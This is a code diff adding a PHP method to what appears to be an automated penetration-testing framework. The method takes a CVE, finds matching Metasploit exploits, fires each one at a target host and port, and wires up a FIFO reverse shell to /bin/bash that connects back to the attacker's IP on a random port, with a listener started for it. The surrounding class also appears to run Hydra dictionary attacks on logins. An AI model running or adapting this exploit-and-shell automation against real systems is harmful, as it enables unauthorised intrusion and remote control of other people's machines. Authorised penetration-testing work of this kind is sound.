@@ -72,6 +72,40 @@ class PORT extends IP{
 	
 	
 	
+	public function msf2search2exec($cve,$name,$platform,$app){
+	    $cve = trim($cve);
+	    
+	    $files_exploit = array();
+	    $this->ssTitre(__FUNCTION__);
+	    $shell = "/bin/bash";
+	    
+	    $attacker_ip = $this->ip4addr4target($this->ip);
+	    
+	    $files_exploit = array_filter($this->msf2cve($cve,$name,$platform,$app)) ;
+	    if (!empty($files_exploit)){
+	        foreach ($files_exploit as $file_exploit){
+	            if(!empty($file_exploit)){
+	                $lport = rand(1024,65535);
+	                $file_exploit = trim($file_exploit);
+	                $this->article("EXEC $file_exploit", $cve);
+	                $cmd_rev = $this->msf2exec($file_exploit,$this->ip,$this->port,$attacker_ip,$lport);
+	                if (!empty($cmd_rev)){
+	                    $templateB64_shell = base64_encode(str_replace("%CMD%", "%SHELL%", $cmd_rev));
+	                    $lprotocol = 'T';
+	                    $type = 'server';
+	                    
+	                    $rev = $this->rev8fifo($attacker_ip, $lport, $shell) ; // OK Lampio
+	                    $cmd = str_replace("%CMD%", $rev, $cmd_rev);
+	                    $this->service4lan($cmd, $templateB64_shell, $lport, $lprotocol,$type);
+	                    
+	                }
+	                
+	            }
+	        }
+	    }
+	    
+	}
+	
 	public function port2auth4dico4hydra($service,$username){
 	    $result = "";
 	    
